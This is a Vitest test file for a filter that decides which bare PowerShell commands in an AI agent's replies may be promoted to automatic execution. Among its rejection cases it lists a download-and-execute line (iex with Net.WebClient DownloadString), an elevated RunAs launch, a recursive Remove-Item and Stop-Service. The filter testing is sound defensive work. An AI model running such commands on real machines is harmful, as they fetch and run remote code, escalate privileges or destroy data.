import { describe, it, expect } from 'vitest';
import { detectPromotableSafeCmd } from './auto-promote';

describe('detectPromotableSafeCmd', () => {
    it('promotes a bare safe command emitted without a tag', () => {
        expect(detectPromotableSafeCmd('Start-Process "C:\\\\Users\\\\x\\\\file.txt"'))
            .toBe('Start-Process "C:\\\\Users\\\\x\\\\file.txt"');
        expect(detectPromotableSafeCmd('Get-Process -Name explorer')).toBe('Get-Process -Name explorer');
    });

    it('quirk preserved: the deny-list "format" also blocks the benign -Format flag', () => {
        // \bformat\b (meant for disk `format`) collides with `-Format` — existing
        // behaviour, kept faithfully by the extraction (not a refactor change).
        expect(detectPromotableSafeCmd('Get-Date -Format o')).toBeNull();
    });

    it('finds the command even when surrounded by prose (line-by-line)', () => {
        const resp = 'He creado el archivo.\nStart-Process "C:\\\\tmp\\\\a.txt"\nListo.';
        expect(detectPromotableSafeCmd(resp)).toBe('Start-Process "C:\\\\tmp\\\\a.txt"');
    });

    it('does NOT promote when an execution tag is already present', () => {
        expect(detectPromotableSafeCmd('<EXECUTE_CMD>Get-Date</EXECUTE_CMD>')).toBeNull();
        expect(detectPromotableSafeCmd('<EXECUTE>whoami</EXECUTE>')).toBeNull();
    });

    it('rejects dangerous lines even with a safe-looking prefix', () => {
        expect(detectPromotableSafeCmd('Start-Process foo -Verb RunAs')).toBeNull();
        expect(detectPromotableSafeCmd('Get-Content x | Remove-Item -Recurse')).toBeNull();
        expect(detectPromotableSafeCmd('Stop-Service Spooler')).toBeNull();
        expect(detectPromotableSafeCmd('iex (New-Object Net.WebClient).DownloadString("http://x")')).toBeNull();
    });

    it('does NOT match prose that merely starts with an allow-listed word', () => {
        expect(detectPromotableSafeCmd('start by opening the folder yourself')).toBeNull();
        expect(detectPromotableSafeCmd('date is shown in the corner')).toBeNull();
        expect(detectPromotableSafeCmd('ping the server to check')).toBeNull();
    });

    it('ignores command content inside <TOOL> / <THOUGHT> scaffolding', () => {
        expect(detectPromotableSafeCmd('<THOUGHT>maybe Get-Date</THOUGHT>')).toBeNull();
        expect(detectPromotableSafeCmd('<TOOL>writefile:x|||y</TOOL>')).toBeNull();
    });

    it('returns null for empty / falsy input', () => {
        expect(detectPromotableSafeCmd('')).toBeNull();
        expect(detectPromotableSafeCmd(null)).toBeNull();
        expect(detectPromotableSafeCmd(undefined)).toBeNull();
    });

    it('skips lines longer than 300 chars', () => {
        expect(detectPromotableSafeCmd('Get-Item ' + 'x'.repeat(400))).toBeNull();
    });
});
